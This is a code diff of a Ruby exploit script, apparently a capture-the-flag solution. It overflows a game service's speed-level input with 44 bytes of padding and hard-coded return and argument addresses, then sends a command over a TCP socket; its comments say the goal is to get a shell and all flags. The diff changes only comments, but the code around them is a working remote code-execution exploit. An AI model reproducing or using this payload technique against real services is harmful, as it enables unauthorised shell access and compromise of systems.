@@ -15,7 +15,7 @@ return_addr = "\xf0\x86\x04\x08"
 # since it's stored in the global string value(char sh[3])
 argument_addr = "\xa0\xb0\x04\x08"
 
-# follwing is to fill the
+# follwing is the buffer to do leaking
 # fill total 44 char
 buf = ''
 44.times { buf << 'a' }
@@ -35,14 +35,17 @@ puts buf
 puts command
 
 s = TCPSocket.open(hostname, port)
+
+# Read lines by lines from the socket
 while line = s.gets
-  # Read lines from the socket
   print line
 
-  # send choice to start game
-  # played not equal 0 means we have played once
+  # send choice '1' to start game
   (line.chop.eql? '3.Exit') && s.send("1\r\n", 0)
-  # send speed setting
+
+  # send speed setting, leak here to get shell!
+  # after get the shell, send the command we want
+  # you can use this to get all flag!
   if line.chop.eql? 'Choose the speed level(1-9):'
     s.send(buf, 0)
     s.send(command, 0)
